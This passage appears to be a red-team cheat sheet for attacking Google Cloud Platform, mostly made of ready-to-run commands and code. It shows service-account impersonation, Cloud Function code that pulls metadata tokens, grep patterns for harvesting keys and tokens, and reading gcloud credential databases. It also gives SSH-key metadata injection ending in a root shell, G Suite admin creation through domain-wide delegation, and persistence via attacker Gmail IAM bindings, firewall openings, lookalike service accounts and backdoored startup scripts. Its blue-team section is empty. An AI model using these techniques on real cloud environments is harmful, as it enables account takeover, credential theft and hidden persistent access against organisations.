
- **Service Account Token Creator** (roles/iam.serviceAccountTokenCreator): Allows members to impersonate service accounts to create (OAuth 2.0) access tokens, sign JSON Web Tokens (JWTs), and sign binary blobs so that they can be used for authentication.
  
- **Workload Identity User** (roles/iam.workloadIdentityUser): Allows members to impersonate service accounts from GKE workloads. This role cannot be granted on individual service accounts, but can be granted on a project, folder, or organization.

--> This requires a special “**Service Account Token Creator Owner**” IAM role (roles/iam.serviceAccountTokenCreator) assigned currently logged-in service account.  

Listing services accounts
```
gcloud iam service-accounts list
```

Impersonate other service account and different commands in the context of that account
```
gcloud compute instances list --impersonate-service-account storage@service-test-001-iam.gserviceaccount.com
gsutil -i storage@service-test-001-iam.gserviceaccount.com ls
```

You can also add the impersonation configuration directly to avoid retyping the --impersonate-service-account parameter.
```
gcloud config set auth/impersonate_service_account storage@service-test-001-iam.gserviceaccount.com
gsutil ls
```

Finally you can use the token and impersonate service account to request the service account access token.
```
gcloud auth print-access-token --impersonate-service-account storage@service-test-001-iam.gserviceaccount.com
```

### From CLI to GCP management console
It is possible if the correct permissions are enable, to add your GMAIL account to the GCP project management console.  

Permissions required: **[roles/iam.securityAdmin](https://cloud.google.com/iam/docs/understanding-roles)**

```
gcloud projects add-iam-policy-binding project-name-000001 --member user:eviluser@gmail.com --role roles/editor
```
--> Try to login with controlled @gmail.com mail account to the management console.  

### Access Scopes
The service account on a GCP Compute Instance will use OAuth to communicate with the Google Cloud APIs. When access scopes are used, the OAuth token that is generated for the instance will have a scope limitation included.  

--> This **does not define** the actual permissions.  

You can see what scopes are assigned by querying the metadata URL.  

```
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor:Google'

https://www.googleapis.com/auth/devstorage.read_only
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
https://www.googleapis.com/auth/servicecontrol
https://www.googleapis.com/auth/service.management.readonly
https://www.googleapis.com/auth/trace.append
```

If an instance has no scope limitation you will received the following result:  
```
https://www.googleapis.com/auth/cloud-platform
```
--> This scope will allow us to authenticate to any API function and leverage the full power of our assigned IAM permissions.  

### Application Default Credentials
As an alternative to first pulling a token from the metadata server, Google also has a strategy called Application Default Credentials. When using one of Google's official GCP client libraries, the code will automatically go searching for credentials to use in a defined order.  

1. First check in source code itself
2. Next is the env variable **GOOGLE_APPLICATION_CREDENTIALS** (point to a service account key file)
3. Finnaly it will use the default token provided by the metadata server as described in the [section above](#access-scopes)

### Check for network and firewall rules
- https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_firewall_enum

This tool will allow you to enumerate the followings:
- CSV file showing instance, public IP, allowed TCP, allowed UDP
- nmap scan to target all instances on ports ingress allowed from the public internet (0.0.0.0/0)
- masscan to target the full TCP range of those instances that allow ALL TCP ports from the public internet (0.0.0.0/0)









## GCP - Privilege Escalation

### GCP - Exploiting Cloud Functions
- https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions

Python code to retrieve function metadata and function service account token
```
import requests
import functions_framework

def exfil():
    res = requests.get('http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token?scopes=https://www.googleapis.com/auth/cloud-platform,https://www.googleapis.com/auth/iam', headers={'Metadata-Flavor': 'Google'})
    return (res)

exfil()
```

```
import subprocess
import random
import io
import string
import json
import os
from urllib.request import Request, urlopen
from base64 import b64decode, b64encode

def req(request):
  request_json = request.get_json()
  req = Request('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token')
  req.add_header('Metadata-Flavor','Google')
  content = urlopen(req).read()
  token = json.loads(content)
  print(token)

```

### GCP - Privesc to other principals
- https://book.hacktricks.xyz/cloud-security/gcp-security/gcp-interesting-permissions/gcp-privesc-to-other-principals

### GCP - Privesc to resources
- https://book.hacktricks.xyz/cloud-security/gcp-security/gcp-interesting-permissions/gcp-privesc-to-resources

### Cloud Privilege Escalation
It's important to know that permissions can be set at the highest level of "Organization" as well. If you can enumerate this info, this will give you an idea of which accounts may have access across all of the projects inside an org.  

Get the numeric organization ID
```
gcloud organizations list
```

Enumerate the policies for each organization ID
```
gcloud organizations get-iam-policy [ORG ID]
```
--> Permissions you will see in return would be applied to **every** project.

### Bypassing access scope
In case you have a powerfull Service Account but limited scope of your current OAuth token.  

1. Pop another boxe, check if another boxe in the environment with less restrictive scope.
   - Look for specific scope you want or **auth/cloud-platform**
```
gcloud compute instances list --quiet --format=json
```
--> Also check for the instance that have the **default service account** assigned (PROJECT_NUMBER-compute@developer.gserviceaccount.com).

### Steal gcloud authorization
It's quite possible that other users on the same box have been running gcloud commands using an account more powerful than your own. You'll need local root to do this.
```
sudo find / -name "gcloud"
```
You can manually inspect the files inside, but these are generally the ones with the secrets:
```
    ~/.config/gcloud/credentials.db
    ~/.config/gcloud/legacy_credentials/[ACCOUNT]/adc.json
    ~/.config/gcloud/legacy_credentials/[ACCOUNT]/.boto
    ~/.credentials.json
```

### More API Regex keys
Service account keys
```
grep -Pzr "(?s){[^{}]*?service_account[^{}]*?private_key.*?}" "$TARGET_DIR"
```

Legacy GCP creds
```
grep -Pzr "(?s){[^{}]*?client_id[^{}]*?client_secret.*?}" "$TARGET_DIR"
```

Google API keys
```
grep -Pr "AIza[a-zA-Z0-9\\-_]{35}" "$TARGET_DIR"
```

Google OAuth tokens
```
grep -Pr "ya29\.[a-zA-Z0-9_-]{100,200}" "$TARGET_DIR"
```

Generic SSH keys
```
grep -Pzr "(?s)-----BEGIN[ A-Z]*?PRIVATE KEY[a-zA-Z0-9/\+=\n-]*?END[ A-Z]*?PRIVATE KEY-----" "$TARGET_DIR"
```

Signed storage URLs
```
grep -Pir "storage.googleapis.com.*?Goog-Signature=[a-f0-9]+" "$TARGET_DIR"
```

Signed policy documents in HTML
```
grep -Pzr '(?s)<form action.*?googleapis.com.*?name="signature" value=".*?">' "$TARGET_DIR"
```

### Follow the Scripts
In case of compute instance compromise, most of the time you can assume this instance is deployed to realized  a specific task or action within the GCP environment, you can also assume that in order to realize its task it needs some permissions/access to other GCP resources (storage, crypto keys or other instances).  

Depending on the permission it is possible that a simple ```gsutil ls``` does not return anything..  
--> Representing that the service account is lacking the **storage.buckets.list** IAM permission.  

**BUT** running running ```gsutil ls gs://instance82736-long-term-script-data``` could give you access to data and additional credentials.  

- Of course brute forcing is a good idea to verify if you can access/list specific bucket
- In case of randomized bucket name such as above **instance82736-long-term-script-data** brute forcing is not an option.

To find specific buckets name, instance name or crypto keys where service account of this instance could have access, you can check the followings:  

Look for references to the gcloud command in scripts within:  
- The instance's metadata local filesystem
- Service unit files, etc.

--> You may also find Python, Ruby, PHP, etc scripts using their own GCP client libraries that leverage the service account's permissions to get things done.

### Modifying instance Metadata
If you can modify the instance's metadata. You can try to escalate your privileges locally.  
**2** scenarios are possible : **Default Service Account** and **Custom Service Account**.  

##### Default Service Account (options availables for access scope when user default service account)
1. Allow default access (default)
2. Allow full access to all Cloud APIs
3. Set access for each API

--> *Option 2* or *Option 3* while explicitly allowing access to the compute API (vulnerable to escalation).  

##### Custom Service Account (when using custom service account one of the following permission is necessary to escalate privileges)
1. compute.instances.setMetadata (to affect a single instance)
2. compute.projects.setCommonInstanceMetadata (to affect all instances in the project)

--> Furthermore you will need one of the following access scopes.  
- https://www.googleapis.com/auth/compute
- https://www.googleapis.com/auth/cloud-platform

##### Add SSH key to custom metadata
When deploying a GCE instance (VM) on Linux or Windows some Guest Agent for Google Compute Engine are deployed.  

On Linux within these agent a [daemon managing the account](https://github.com/GoogleCloudPlatform/guest-agent#account-management) for the instance is used.  

As Google Documentation explain :   
> On Linux: If OS Login is not used, the guest agent will be responsible for provisioning and deprovisioning user accounts. The agent creates local user accounts and maintains the authorized SSH keys file for each. User account creation is based on adding and remove SSH Keys stored in metadata.

--> The deployed agent will periodically queries the instance metadata endpoint for changes to the authorized SSH public keys.  

If a new public key is encountered, it will be processed and added to the local machine, depending on the format of the key :  
- Added to **~/.ssh/authorized_keys**
- Or will create a new user with **sudo** rights

**Attacker Scenario 1** : If you can modify the custom instance metadata with your service account, you can **escalate to root** on the local system by gaining SSH rights to a privileged account.  

**Attacker Scenario 2** : If you can modify project metadata, you can escalate to root on any system in the current GCP project that is running that accounts daemon.  

##### Attacker Scenario 1
Check the instance for existing SSH keys. Pick on of these users as they are likely to have sudo rights.
```
gcloud compute instances describe [INSTANCE] --zone [ZONE]

```

The format of public keys are different from traditional authorized key file.
```
 ...
 metadata:
   fingerprint: QCZfVTIlKgs=
   items:
   ...
   - key: ssh-keys
     value: |-
       alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
       bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
 ...
```
--> Save the line with usernames and keys in a new text file called **meta.txt**.

Let's assume we are targeting the user alice from above. We'll generate a new key for ourselves like this:
```
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
Take the output of the command above and use it to add a line to the **meta.txt** file you create above, ensuring to add **alice:** to the beggining of your new public key.

**meta.txt** should now look something like this, including the existing keys and the new key you just generated:

```
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnthNXHxi31LX8PlsGdIF/wlWmI0fPzuMrv7Z6rqNNgDYOuOFTpM1Sx/vfvezJNY+bonAPhJGTRCwAwytXIcW6JoeX5NEJsvEVSAwB1scOSCEAMefl0FyIZ3ZtlcsQ++LpNszzErreckik3aR+7LsA2TCVBjdlPuxh4mvWBhsJAjYS7ojrEAtQsJ0mBSd20yHxZNuh7qqG0JTzJac7n8S5eDacFGWCxQwPnuINeGoacTQ+MWHlbsYbhxnumWRvRiEm7+WOg2vPgwVpMp4sgz0q5r7n/l7YClvh/qfVquQ6bFdpkVaZmkXoaO74Op2Sd7C+MBDITDNZPpXIlZOf4OLb alice
```

Rewrite the SSH key metadata for you instance with the following command:
```
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

You can now access a shell in the context of alice as follows:
```
lowpriv@instance:~$ ssh -i ./key alice@localhost
alice@instance:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)

```

##### Attacker Scenario 2
You can follow the same process as above, but just make up a new username.  
This user will be created automatically and given rights to sudo.  

```
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost

```

Grant **sudo** to existing session
```
gcloud compute ssh <InstanceName>
```
- This will generate a new SSH key
- Add it to your existing user
- Add your existing username to the **google-sudoers** group
- Start a new SSH session

**Note** : In case of **OS Login** usage.   
> OS Login simplifies SSH access management by linking your Linux user account to your Google identity. Administrators can easily manage access to instances at either an instance or project level by setting IAM permissions.

--> OS Login is enabled at the project or instance level using the metadata key of **enable-oslogin = TRUE**.  
--> OS Login with two-factor authentication is enabled in the same manner with the metadata key of **enable-oslogin-2fa = TRUE**  

If OS Login enable, attacker will need the following permission applied to project or instance level:
- roles/compute.osLogin (*no sudo*)
- roles/compute.osAdminLogin (*has sudo*)

### GCP CloudBuild
A user with permissions to start a new build with Cloud Build can gain access to the Cloud Build Service Account and abuse it for more access to the environment.  

To exploit this as a user in GCP, we only need one IAM permission granted to the user in question:  

- cloudbuild.builds.create

--> https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/
--> https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudbuild.builds.create.py

### Exploring other projects
It is possible the service account you compromised on an instance has access to additional GCP projects.  

```
gcloud projects list
gcloud config set project [PROJECT-ID]
```

### Spreading to GSuite via domain-wide delegation of authority

**Objective** : Accessing GSuite from a service account within GCP environment.  

Service accounts in GCP can be granted the rights to programatically access user data in G Suite by impersonating legitimate users.  
This is known as **domain-wide delegation**. This includes actions such as:
- Reading email in GMail
- Accessing Google Docs
- Creating new user accounts in the G Suite organization (in case of administrator role)

--> It is possible that a G Suite administrator has granted some level of G Suite API access to a GCP service account that you control.

Verify via Web UI (management console):
```
IAM Menu -> Service Accounts 
--> Check if any of the accounts have "**Enabled**" listed under the "**domain-wide delegation**" column
```

**Note** : GSuite administrator would also have to configure this in the G Suite admin console.  

As attacker you need the service account JSON credentials..

> Your service account has something called a "client_email" which you can see in the JSON credential file you export. It probably looks something like account-name@project-name.iam.gserviceaccount.com. If you try to access G Suite API calls directly with that email, even with delegation enabled, you will fail. This is because the G Suite directory will not include the GCP service account's email addresses. Instead, to interact with G Suite, we need to actually impersonate valid G Suite users.  

- [gcp_delegation](https://gitlab.com/gitlab-com/gl-security/gl-redteam/gcp_misc/blob/master/gcp_delegation.py) script

```
# Validate access only
$ ./gcp_delegation.py --keyfile ./credentials.json \
    --impersonate steve.admin@target-org.com \
    --domain target-org.com

# List the directory
$ ./gcp_delegation.py --keyfile ./credentials.json \
    --impersonate steve.admin@target-org.com \
    --domain target-org.com \
    --list

# Create a new admin account
$ ./gcp_delegation.py --keyfile ./credentials.json \
    --impersonate steve.admin@target-org.com \
    --domain target-org.com \
    --account pwned
```

If you have success creating a new admin account, you can log on to the Google admin console and have full control over everything in G Suite for every user - email, docs, calendar, etc.  

## Compute engine : Privilege Escalation


## Privilege escalation - Rhinosecurity Labs research
https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/
https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/
https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation











## GCP - Persistence
### Accessing tokens
In case you compromise a laptop, Mac, or server with Gcloud CLI installed.  

GCP tokens are stored within an SQL Lite database.  

- MAC Accessing tokens
```
ls /Users/bryce/.config/gcloud/access_tokens.db

sqlite3 access_tokens.db "select * from access_tokens"
```
- Linux Accessing tokens
```
ls /home/jdoe/.config/gcloud/access_tokens.db

sqlite3 access_tokens.db "select * from access_tokens"
```
- Windows Accessing tokens
```
dir C:\Users\username\AppData\Roaming\gcloud\access_tokens.db

sqlite3 access_tokens.db "select * from access_tokens"
```
Additionnally you can access Scope every token using **credentials.db** database.
```
sqlite3 credentials.db "select * from credentials
```

GCP Service Account credentials
```
Env variable: $env:GOOGLE_APPLICATION_CREDENTIALS="C:\Users\jdoe\download\projetID.json"
```

If user is logged as user account using application default credentials
```
/home/jdoe/.config/gcloud/application_default_credentials.json
C:\Users\username\AppData\Roaming\gcloud\application_default_credentials.json
```

Validating Access Token
```
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=AccessToken
```

**Reusing a token**: [GCP Token Reuse](https://github.com/RedTeamOperations/GCPTokenReuse)

### Browser Cookies
--> **If Root Access**-> Export (Safari,Chrome,Firefox,etc...)

- Mitre Att&ck technique - [T1539](https://attack.mitre.org/techniques/T1539/) - Steal Web Session Cookie
- Mitre Att&ck technique - [T1550](https://attack.mitre.org/techniques/T1550/) - Sub-Technique [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004/)

- https://embracethered.com/blog/posts/passthecookie/
- https://maxchadwick.xyz/blog/exporting-your-browser-cookies-on-a-mac/

--> **No Root Access**
- https://github.com/defaultnamehere/cookie_crimes

<img src="./Images/cookie_browser.png" alt="cookies" width="600"/>

### Cloud Shell Persistence
Using Cloud Shell online, the machine comes pre-installed with the Google Cloud SDK but also with **5GB** HOME directory which will **persist** across sessions.

--> Backdoor the **.bashrc** file

### Firewall rules persistence
Objective : Persistent connection to a GCP resource such as a compute engine.  

The following example represent an SQL injection resulting in RCE in one of the internal applications hosted on compute instance. This instance is only accessible from corporate internal network.

--> As an attacker we will allow our attacker IP address to connect to that instance on port 443.

```
gcloud compute firewall-rules list
gcloud compute firewall-rules create "tcp-rule" --allow tcp:443 --source-range="167.xx.xx.xx" --description="443 TCP traffic"
gcloud compute firewall-rules delete tcp-rule
```

### Service Account persistence
Creating a service account similar to an existing one.  
```
gcloud iam service-accounts create almost-legitimate-account --display-name "legit account hack"
gcloud iam service-accounts list
gcloud iam service-accounts keys create --iam-account "almost-legitimate-account@test-project-1234.iam.gserviceaccount.com" key.json
cat key.json
```

### IAM user add persistence
Adding attacker/owned GMAIL address to the project list with **Editor** role.

```
gcloud projects add-iam-policy-binding test-project-1234 --member="attacker@gmail.com" --role="roles/editor"
gcloud auth login
gcloud projects list
```
### Persistence using startup scripts
Startup scripts are file that performs tasks during the startup process of a virtual machine (VM) instance.  

##### Windows 
Windows [startup scripts](https://cloud.google.com/compute/docs/instances/startup-scripts/windows) must be Command shell (.cmd), PowerShell (.ps1), or batch file scripts (.bat), and must have the appropriate file extension.

--> Require permission : **compute.instances.setMetadata** on the VM

If you specify a startup script by using one of the procedures in this document, Compute Engine does the following:
- Copies the startup script to the VM
- Task Scheduler runs the startup script as the LocalSystem account when the VM boots

```
gcloud compute instances add-metadata testVM --metadata-from-file=windows-startup-script-ps1=./backdoor.ps1
```

##### Linux
Linux [startup scripts](https://cloud.google.com/compute/docs/instances/startup-scripts/linux) can be bash or non-bash file. To use a non-bash file, designate the interpreter by adding a #! to the top of the file. For example, to use a Python 3 startup script, add #! /usr/bin/python3 to the top of the file

### Persistence using browser connect SSH-RDP

##### Linux - Using SSH-in-browser
Directly accessing Linux through SSH via your browser and use the persistence mechanism of your choice.

<img src="https://cloud.google.com/docs/images/establish-ssh-connection-1.png" alt="gcphierarchy" width="700"/>


##### Windows - Using Chrome Remote Desktop
Same as within Linux VM for SSH access you can use RDP access within the GCP web console from your browser.  

Chrome Remote Desktop is a service that lets you remotely access another computer by using a web browser. Chrome Remote Desktop works on Windows, macOS, and Linux and does not require the VM instance to have a public IP address.  

<img src="https://cloud.google.com/compute/images/connecting-to-windows-instances.svg" alt="gcphierarchy" width="700"/>

### Adding SSH key to project
Add SSH key to GCP project, every instances that spin up will allow you to SSH into it.  
--> SSH key will not be visible at compute level.  

```
gcloud compute --project=<projectName> project-info add-metadata --metadata-from-file ssh-keys=./mykeys.txt
```
This is also possible from [web console](https://medium.com/@rajeshkanna_a/google-cloud-platform-adding-or-removing-project-wide-public-ssh-keys-5e3fcf22f75d).


## GCP - Blue Teaming / Detection

### Visibility
#### Asset Inventory
Asset inventory provide a full visbility over all the GCP resources accross all the zone in used.  

### Security Controls


### Logging


### Monitoring

### GCP - Incidence Response


## GCP - Resources

### GCP - Security - HackTricks
- https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security

### Attacking and Defending GCP Metadata API
- https://github.com/dxa4481/AttackingAndDefendingTheGCPMetadataAPI

### GCP - Pentestbook
- https://pentestbook.six2dez.com/enumeration/cloud/gcp

### GCP - Penetration Testing Notes
- https://0xd4y.com/2022/10/01/GCP-Penetration-Testing-Notes/

### Privilege escalation and post-exploitation in GCP
- https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/

### Defcon - Lateral movement and privilege escalation in GCP
- https://www.youtube.com/watch?v=Z-JFVJZ-HDA

### Hacking GCP - Richard Knowell
- https://www.amazon.ca/Advanced-Penetration-Testing-Hacking-Platform/dp/B08P1H4KLZ

### Cloud Security - Red Team Management
- https://github.com/CyberSecurityUP/Red-Team-Management/tree/main/Cloud%20Security

### GCP Looting
- https://book.hacktricks.xyz/cloud-security/gcp-security/gcp-looting

### Security Bugs in Google Cloud Platform (LiveOverflow)
- https://www.youtube.com/watch?v=J2icGMocQds
- https://www.youtube.com/watch?v=g-JgA1hvJzA

## Introducing PurplePanda: AUTOMATED Privilege Escalation IN THE CLOUD
- https://www.youtube.com/watch?v=zl5NdvoWHX4

## DEF CON 29 - Matthew Bryant - Hacking G Suite
- https://www.youtube.com/watch?v=6YimrCDK19A

## Red Team engagement in GCP
- https://www.youtube.com/watch?v=AwXswDg-rKc 

### GCP Pentest Notes
- https://infosecwriteups.com/pentest-notes-google-cloud-edition-2e138bb0f504
- https://medium.com/@tomaszwybraniec/google-cloud-platform-pentest-notes-service-accounts-b960dc59d93a

### GCP - OAuth token hijacking in GCP
- https://www.netskope.com/fr/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1
- https://www.netskope.com/fr/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2

### Oauth authorization/device flow
- https://www.netskope.com/fr/blog/new-phishing-attacks-exploiting-oauth-authorization-flows-part-1

### GCP Application default credentials
- https://medium.com/datamindedbe/application-default-credentials-477879e31cb5

### GCP - Secure GCP Reference
- https://github.com/doitintl/secure-gcp-reference

### GCP - Threat investigation
- https://cloud.google.com/security-command-center/docs/how-to-investigate-threats

### Training - Vulnerable Cloud environments
- Cloudgoat - https://github.com/RhinoSecurityLabs/cloudgoat
- SadCloud - https://github.com/nccgroup/sadcloud
- Flaws Cloud - http://flaws.cloud
- Thunder CTF - http://thunder-ctf.cloud
